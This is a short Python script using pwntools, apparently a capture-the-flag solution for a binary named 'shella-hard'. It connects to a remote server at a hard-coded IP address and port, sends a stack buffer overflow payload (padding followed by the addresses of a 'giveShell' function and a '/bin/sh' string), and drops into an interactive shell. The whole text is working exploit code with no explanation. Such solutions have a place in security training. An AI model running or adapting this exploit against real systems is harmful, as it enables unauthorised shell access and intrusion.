from pwn import *

#p = process("./shella-hard")
p = remote("3.16.169.157", 12345)
giveShell = 0x08048467
bin_sh = 0x08048500
main = 0x0804843b

def exp():
	pause()
	payload = "A"*0x14
	payload += p32(giveShell)
	payload += p32(bin_sh)
	payload += p32(0)
	payload += p32(0)
	p.sendline(payload)
	pause()
	p.interactive()

if __name__=='__main__':
	exp()
